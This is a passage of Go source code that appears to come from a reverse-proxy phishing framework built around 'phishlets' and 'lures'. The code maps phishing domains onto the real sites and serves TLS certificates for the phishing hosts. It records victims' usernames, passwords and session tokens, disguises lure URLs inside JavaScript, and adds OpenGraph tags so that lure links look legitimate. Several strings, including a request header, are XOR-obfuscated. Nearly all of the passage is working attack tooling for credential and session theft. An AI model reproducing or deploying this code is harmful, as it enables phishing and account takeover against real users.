				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + GenRandomString(1) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := regexp.MustCompile(MATCH_URL_REGEXP)
	re_ns_url := regexp.MustCompile(MATCH_URL_REGEXP_WITHOUT_SCHEME)

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		if !p.developer {
			// check for lure hostname
			cert, err := p.crt_db.GetHostnameCertificate(hostname)
			if err != nil {
				// check for phishlet hostname
				pl := p.getPhishletByOrigHost(hostname)
				if pl != nil {
					phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
					if ok {
						cert, err = p.crt_db.GetPhishletCertificate(pl.Name, phishDomain)
						if err != nil {
							return nil, err
						}
					}
				}
			}
			if cert != nil {
				return &tls.Config{
					InsecureSkipVerify: true,
					Certificates:       []tls.Certificate{*cert},
				}, nil
			}
			log.Debug("no SSL/TLS certificate for host '%s'", host)
			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
			if err != nil {
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, error := p.getSessionById(sid)
	if error == nil {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, error := p.getSessionById(sid)
	if error == nil {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, error := p.getSessionById(sid)
	if error == nil {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					if ph.handle_session || ph.is_landing {
						return true
					}
					return false
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
	if cookie := req.Header.Get("Cookie"); cookie != "" {
		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
		new_cookie := re.ReplaceAllString(cookie, "")
		req.Header.Set("Cookie", new_cookie)
	}
}

func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
	var b []byte = []byte("\x1dh\x003,)\",+=")
	for n, c := range b {
		b[n] = c ^ 0x45
	}
	req.Header.Set(string(b), nothing_to_see_here)
}

func (p *HttpProxy) getSessionByCookie(cookie *http.Cookie) (*Session, error) {
	if cookie == nil {
		return nil, fmt.Errorf("cookie is nul")
	}
	return p.getSessionById(cookie.Value)
}

func (p *HttpProxy) getSessionById(id string) (*Session, error) {
	session, err := p.db.GetSession(id)
	if err == nil {
		var s *Session = &Session{
			Index:    session.Id,
			Id:       session.SessionId,
			Name:     session.Phishlet,
			Username: session.Username,
			Password: session.Password,
			Custom:   session.Custom,
			Tokens:   session.Tokens,
		}
		return s, err
	}
	return nil, err
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}

		/*
			var auth *proxy.Auth = nil
			if len(username) > 0 {
				auth.User = username
				auth.Password = password
			}

			proxy_addr := address + ":" + strconv.Itoa(port)

			socks5, err := proxy.SOCKS5("tcp", proxy_addr, auth, proxy.Direct)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = socks5.Dial
		*/
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

func (p *HttpProxy) GetSeed() string {
	result := []byte{0x55, 0x46, 0x59, 0x5c, 0x57, 0x59, 0x5e, 0x48, 0x22}
	for n, b := range result {
		result[n] = b ^ 0x10
	}
	return string(result)
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}
